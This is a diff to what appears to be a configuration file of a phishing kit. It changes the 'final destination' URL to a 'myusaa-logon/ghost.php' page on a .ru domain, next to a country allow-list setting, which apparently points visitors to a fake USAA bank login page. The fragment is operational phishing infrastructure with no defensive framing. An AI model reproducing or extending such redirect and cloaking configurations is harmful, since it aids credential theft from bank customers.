@@ -19,7 +19,7 @@
     },
     "FINAL_DESTINATION": {
       "description": "Your final landing page URL",
-      "value": "https://rep.zynvero.ru/shiro/ghost.php"
+      "value": "https://rep.zynvero.ru/myusaa-logon/ghost.php"
     },
     "ALLOWED_COUNTRIES": {
       "description": "Comma-separated allowed countries",
